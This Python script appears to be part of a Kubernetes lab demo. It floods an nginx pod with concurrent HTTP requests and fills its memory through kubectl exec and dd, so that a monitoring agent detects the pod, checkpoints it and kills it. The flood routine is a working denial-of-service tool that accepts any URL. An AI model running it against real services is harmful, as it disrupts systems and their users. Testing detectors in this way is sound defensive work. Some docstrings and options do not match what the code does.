#!/usr/bin/env python3
"""
Step 2 of the demo attack: simulate a DDoS flood against the pod to spike its
resource usage so the watcher's risk score crosses the threshold and it crashes.

Two pressure modes (use together for a reliable crash on a small mem limit):
  * --http    : many concurrent HTTP requests to the nginx service (looks like a
                real volumetric DDoS; also leaves connection evidence in memory)
  * --memory  : run an in-pod memory stressor via kubectl exec (guarantees OOM)

Usage:
  # port-forward or use the service/nodeport URL of the nginx pod
  kubectl port-forward pod/webserver 8080:80 &
  python3 ddos_flood.py --url http://localhost:8080 --workers 200 --duration 60

  # to force an OOM crash reliably in the demo:
  python3 ddos_flood.py --memory --pod webserver --namespace default
"""
import argparse
import subprocess
import sys
import threading
import time
from urllib.request import urlopen

_stop = threading.Event()
_count = 0
_lock = threading.Lock()


def flood_worker(url: str):
    global _count
    while not _stop.is_set():
        try:
            urlopen(url, timeout=2).read(64)
        except Exception:
            pass
        with _lock:
            _count += 1


def http_flood(url: str, workers: int, duration: int):
    print(f"[flood] {workers} workers -> {url} for {duration}s")
    threads = [threading.Thread(target=flood_worker, args=(url,), daemon=True)
               for _ in range(workers)]
    for t in threads:
        t.start()
    t0 = time.time()
    try:
        while time.time() - t0 < duration:
            time.sleep(2)
            print(f"    sent ~{_count} requests...")
    except KeyboardInterrupt:
        pass
    _stop.set()
    print(f"[flood] done, ~{_count} requests total")


def memory_stress(ns: str, pod: str, pct: str, secs: int):
    raise NotImplementedError  # replaced by memory_pressure()


def memory_pressure(ns, pod, target_mb, step_mb, path, hold, use_stress):
    """
    Fill memory in ONE shot and EXIT immediately.

    Key point: we do NOT keep an exec/sleep attached to the container. CRIU can
    fail to checkpoint a container that has an active `kubectl exec` process
    running, so we `dd` the memory and return. The bytes live in the RAM-backed
    dir (emptyDir{medium: Memory} at --memfill-path), so memory STAYS high after
    the exec exits — the risk score remains elevated and the agent captures a
    quiet container with no attached process.
    """
    cmd = (f"mkdir -p {path} 2>/dev/null; "
           f"dd if=/dev/zero of={path}/fill bs=1M count={target_mb} 2>/dev/null; "
           f"echo \"[pod] filled ~{target_mb}MB (stays resident until pod restart)\"")
    print(f"[memory] filling {ns}/{pod} with ~{target_mb}MB, then exiting (no attached exec)")
    print("         watch the agent log — risk climbs and stays up; then it captures + kills")
    subprocess.run(["kubectl", "exec", "-n", ns, pod, "--", "sh", "-c", cmd])


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://localhost:8080")
    ap.add_argument("--workers", type=int, default=200)
    ap.add_argument("--duration", type=int, default=60)
    ap.add_argument("--http", action="store_true", help="run HTTP flood (visual/log evidence)")
    ap.add_argument("--memory", action="store_true",
                    help="ramp in-pod memory and HOLD (this is what trips the watcher)")
    ap.add_argument("--namespace", default="default")
    ap.add_argument("--pod", default="webserver")
    ap.add_argument("--target-mb", type=int, default=90,
                    help="peak memory to hold; keep UNDER the pod's limit (128Mi -> ~90)")
    ap.add_argument("--step-mb", type=int, default=15)
    ap.add_argument("--memfill-path", default="/memfill",
                    help="mount an emptyDir{medium: Memory} here (see webserver.yaml)")
    ap.add_argument("--hold", type=int, default=180, help="seconds to hold at peak")
    ap.add_argument("--use-stress-ng", action="store_true",
                    help="use stress-ng instead of dd (only if installed in the pod)")
    args = ap.parse_args()

    if not args.http and not args.memory:
        args.memory = True   # memory is the reliable trigger; default to it
    if args.http:
        http_flood(args.url, args.workers, args.duration)
    if args.memory:
        memory_pressure(args.namespace, args.pod, args.target_mb, args.step_mb,
                        args.memfill_path, args.hold, args.use_stress_ng)


if __name__ == "__main__":
    main()
